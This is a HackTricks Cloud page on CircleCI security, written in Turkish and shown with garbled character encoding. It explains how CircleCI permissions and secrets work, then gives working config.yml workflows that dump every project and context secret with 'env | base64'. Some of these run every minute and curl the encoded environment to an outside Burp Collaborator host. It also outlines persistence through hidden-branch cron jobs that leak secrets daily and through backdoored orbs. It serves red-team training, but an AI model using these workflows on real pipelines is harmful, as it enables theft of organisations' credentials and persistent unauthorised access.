# CircleCI GÃ¼venliÄŸi

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

### Temel Bilgiler

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) sÃ¼rekli entegrasyon platformudur; burada ne yapmak istediÄŸinizi ve ne zaman yapmak istediÄŸinizi belirten **ÅŸablonlar** tanÄ±mlayabilirsiniz. Bu ÅŸekilde, Ã¶rneÄŸin, **testleri** veya **daÄŸÄ±tÄ±mlarÄ±** doÄŸrudan **repo ana dalÄ±nÄ±zdan** **otomatikleÅŸtirebilirsiniz**.

### Ä°zinler

**CircleCI**, giriÅŸ yapan **hesap** ile ilgili github ve bitbucket'tan **izinleri devralÄ±r**.\
Testlerimde, eÄŸer **github'daki repo Ã¼zerinde yazma izinleriniz varsa**, **CircleCI'de proje ayarlarÄ±nÄ± yÃ¶netebileceÄŸinizi** kontrol ettim (yeni ssh anahtarlarÄ± ayarlamak, proje api anahtarlarÄ±nÄ± almak, yeni CircleCI yapÄ±landÄ±rmalarÄ± ile yeni dallar oluÅŸturmak...).

Ancak, **repo'yu CircleCI projesine dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in** bir **repo yÃ¶neticisi** olmanÄ±z gerekir.

### Ortam DeÄŸiÅŸkenleri ve Gizli Anahtarlar

[**belgelere**](https://circleci.com/docs/2.0/env-vars/) gÃ¶re, bir iÅŸ akÄ±ÅŸÄ± iÃ§inde **ortam deÄŸiÅŸkenlerine deÄŸer yÃ¼klemenin** farklÄ± yollarÄ± vardÄ±r.

#### YerleÅŸik ortam deÄŸiÅŸkenleri

CircleCI tarafÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±lan her konteyner, her zaman [**belgelere tanÄ±mlanan belirli ortam deÄŸiÅŸkenlerine**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) sahip olacaktÄ±r; Ã¶rneÄŸin `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` veya `CIRCLE_USERNAME`.

#### DÃ¼z metin

BunlarÄ± bir **komut** iÃ§inde dÃ¼z metin olarak tanÄ±mlayabilirsiniz:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
**Ã‡alÄ±ÅŸma ortamÄ±** iÃ§inde aÃ§Ä±k metin olarak tanÄ±mlayabilirsiniz:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
**build-job ortamÄ±nda** aÃ§Ä±k metin olarak tanÄ±mlayabilirsiniz:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
**bir konteynerin ortamÄ±nda** aÃ§Ä±k metin olarak beyan edebilirsiniz:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
#### Proje Gizli Bilgileri

Bunlar, yalnÄ±zca **proje** (her **dal** tarafÄ±ndan) **eriÅŸilebilir** olan **gizli bilgilerdir**.\
OnlarÄ± _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ adresinde **tanÄ±mlanmÄ±ÅŸ** olarak gÃ¶rebilirsiniz.

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
"**DeÄŸiÅŸkenleri Ä°Ã§e Aktar**" iÅŸlevi, bu projeye **diÄŸer projelerden deÄŸiÅŸkenleri iÃ§e aktarmaya** olanak tanÄ±r.
{% endhint %}

#### BaÄŸlam Gizli Bilgileri

Bunlar **Ã¶rgÃ¼t genelinde** gizli bilgilerdir. **VarsayÄ±lan olarak herhangi bir repo**, burada saklanan **herhangi bir gizli bilgiye** eriÅŸebilecektir:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Ancak, farklÄ± bir grubun (TÃ¼m Ã¼yeler yerine) **belirli kiÅŸilere gizli bilgilere eriÅŸim vermek iÃ§in seÃ§ilebileceÄŸini** unutmayÄ±n.\
Bu, gizli bilgilerin **gÃ¼venliÄŸini artÄ±rmanÄ±n** en iyi yollarÄ±ndan biridir; herkesin eriÅŸmesine izin vermek yerine sadece bazÄ± kiÅŸilerin eriÅŸmesine izin vermektir.
{% endhint %}

### SaldÄ±rÄ±lar

#### AÃ§Ä±k Metin Gizli Bilgilerini Arama

EÄŸer **VCS'ye** (github gibi) **eriÅŸiminiz** varsa, her **dalda her repo iÃ§in** `.circleci/config.yml` dosyasÄ±nÄ± kontrol edin ve orada saklanan potansiyel **aÃ§Ä±k metin gizli bilgileri** **arama** yapÄ±n.

#### Gizli Ã‡evre DeÄŸiÅŸkenleri ve BaÄŸlam SÄ±ralamasÄ±

Kodu kontrol ederek, her `.circleci/config.yml` dosyasÄ±nda **kullanÄ±lan tÃ¼m gizli bilgi adlarÄ±nÄ±** bulabilirsiniz. AyrÄ±ca, bu dosyalardan **baÄŸlam adlarÄ±nÄ±** alabilir veya bunlarÄ± web konsolunda kontrol edebilirsiniz: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

#### Proje gizli bilgilerini dÄ±ÅŸarÄ±ya aktarma

{% hint style="warning" %}
TÃ¼m proje ve baÄŸlam **GÄ°ZLÄ° BÄ°LGÄ°LERÄ°NÄ°** **dÄ±ÅŸarÄ±ya aktarmak** iÃ§in, **tÃ¼m github Ã¶rgÃ¼tÃ¼nde yalnÄ±zca 1 repoya** **YAZMA** eriÅŸimine sahip olmanÄ±z **yeterlidir** (_ve hesabÄ±nÄ±zÄ±n baÄŸlamlara eriÅŸimi olmalÄ±dÄ±r, ancak varsayÄ±lan olarak herkes her baÄŸlama eriÅŸebilir_).
{% endhint %}

{% hint style="danger" %}
"**DeÄŸiÅŸkenleri Ä°Ã§e Aktar**" iÅŸlevi, bu projeye **diÄŸer projelerden deÄŸiÅŸkenleri iÃ§e aktarmaya** olanak tanÄ±r. Bu nedenle, bir saldÄ±rgan **tÃ¼m repolardan tÃ¼m proje deÄŸiÅŸkenlerini iÃ§e aktarabilir** ve ardÄ±ndan **hepsini birlikte dÄ±ÅŸarÄ±ya aktarabilir**.
{% endhint %}

TÃ¼m proje gizli bilgileri her zaman iÅŸlerin Ã§evresinde ayarlanÄ±r, bu nedenle sadece Ã§evreyi Ã§aÄŸÄ±rmak ve base64 ile obfuscate etmek, **iÅŸ akÄ±ÅŸlarÄ± web gÃ¼nlÃ¼k konsolunda** gizli bilgileri dÄ±ÅŸarÄ±ya aktaracaktÄ±r:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
EÄŸer **web konsoluna eriÅŸiminiz yoksa** ama **repo'ya eriÅŸiminiz varsa** ve CircleCI'nin kullanÄ±ldÄ±ÄŸÄ±nÄ± biliyorsanÄ±z, sadece **her dakika tetiklenen** ve **gizli bilgileri harici bir adrese sÄ±zdÄ±ran** bir **iÅŸ akÄ±ÅŸÄ±** oluÅŸturabilirsiniz:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
#### BaÄŸlam Gizli Bilgilerini SÄ±zdÄ±rma

**baÄŸlam adÄ±nÄ± belirtmeniz gerekir** (bu aynÄ± zamanda proje gizli bilgilerini de sÄ±zdÄ±racaktÄ±r):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
EÄŸer **web konsoluna eriÅŸiminiz yoksa** ama **repo'ya eriÅŸiminiz varsa** ve CircleCI'nin kullanÄ±ldÄ±ÄŸÄ±nÄ± biliyorsanÄ±z, her **dakika tetiklenen** ve **gizli bilgileri harici bir adrese sÄ±zdÄ±ran** bir **iÅŸ akÄ±ÅŸÄ±nÄ±** basitÃ§e **deÄŸiÅŸtirebilirsiniz**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Yeni bir `.circleci/config.yml` oluÅŸturmak **bir circleci build'ini tetiklemek iÃ§in yeterli deÄŸildir**. **Bunu circleci konsolunda bir proje olarak etkinleÅŸtirmeniz gerekir**.
{% endhint %}

#### Buluta KaÃ§Ä±ÅŸ

**CircleCI**, **build'lerinizi kendi makinelerinde veya kendi makinelerinizde Ã§alÄ±ÅŸtÄ±rma** seÃ§eneÄŸi sunar.\
VarsayÄ±lan olarak, onlarÄ±n makineleri GCP'de bulunmaktadÄ±r ve baÅŸlangÄ±Ã§ta ilgili bir ÅŸey bulamayacaksÄ±nÄ±z. Ancak, bir kurban **kendi makinelerinde (potansiyel olarak, bir bulut ortamÄ±nda)** gÃ¶revleri Ã§alÄ±ÅŸtÄ±rÄ±yorsa, Ã¼zerinde ilginÃ§ bilgiler bulunan bir **bulut meta veri uÃ§ noktasÄ±** bulabilirsiniz.

Ã–nceki Ã¶rneklerde her ÅŸeyin bir docker konteyneri iÃ§inde baÅŸlatÄ±ldÄ±ÄŸÄ±nÄ± unutmayÄ±n, ancak ayrÄ±ca **bir VM makinesi baÅŸlatmasÄ±nÄ± isteyebilirsiniz** (farklÄ± bulut izinlerine sahip olabilir):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Veya uzaktan bir docker hizmetine eriÅŸimi olan bir docker konteyneri:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
#### SÃ¼reklilik

* **KullanÄ±cÄ± token'larÄ± oluÅŸturmak** mÃ¼mkÃ¼ndÃ¼r **CircleCI**'de API uÃ§ noktalarÄ±na kullanÄ±cÄ± eriÅŸimi ile eriÅŸmek iÃ§in.
* _https://app.circleci.com/settings/user/tokens_
* **Proje token'larÄ± oluÅŸturmak** mÃ¼mkÃ¼ndÃ¼r, token'a verilen izinlerle projeye eriÅŸmek iÃ§in.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Projelere **SSH anahtarlarÄ± eklemek** mÃ¼mkÃ¼ndÃ¼r.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Her gÃ¼n tÃ¼m **context env** deÄŸiÅŸkenlerini **sÄ±zdÄ±ran** beklenmedik bir projede **gizli dalda bir cron iÅŸi oluÅŸturmak** mÃ¼mkÃ¼ndÃ¼r.
* Ya da her gÃ¼n tÃ¼m context ve **projelerin sÄ±rlarÄ±nÄ±** **sÄ±zdÄ±ran** bilinen bir iÅŸi bir dalda oluÅŸturmak / deÄŸiÅŸtirmek mÃ¼mkÃ¼ndÃ¼r.
* EÄŸer bir github sahibiyseniz, **doÄŸrulanmamÄ±ÅŸ orb'lere izin verebilir** ve bir iÅŸi **arka kapÄ±** olarak yapÄ±landÄ±rabilirsiniz.
* BazÄ± gÃ¶revlerde bir **komut enjeksiyonu aÃ§Ä±ÄŸÄ±** bulabilir ve bir **sÄ±r** deÄŸerini deÄŸiÅŸtirerek **komutlar enjekte** edebilirsiniz.

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
